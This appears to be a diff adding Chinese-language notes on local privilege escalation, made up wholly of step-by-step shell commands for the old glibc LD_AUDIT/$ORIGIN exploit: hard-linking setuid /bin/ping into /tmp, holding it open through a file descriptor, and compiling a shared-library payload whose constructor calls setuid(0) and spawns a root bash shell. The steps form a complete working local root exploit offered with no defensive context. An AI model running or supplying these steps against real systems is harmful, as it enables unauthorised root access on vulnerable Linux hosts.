@@ -1,0 +1,21 @@
+1.提权
+	步骤：
+		1.登陆普通用户
+		ll -d /tmp
+		cd /tmp
+		mkdir exploit
+		ln /bin/ping  /tmp/exploit/target
+		exec 3</tmp/exploit/target
+		ll /proc/$$/fd/3
+		rm -rf /tmp/exploit
+		ll /proc/$$/fd/3
+		vi payload.c
+			void __attribute__((constructor)) init()
+			{
+				setuid(0);
+				system("/bin/bash");
+			}
+			保存退出
+		gcc -w -fPIC -shared -o /tmp/exploit payload.c
+		ll /tmp/exploit
+		LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
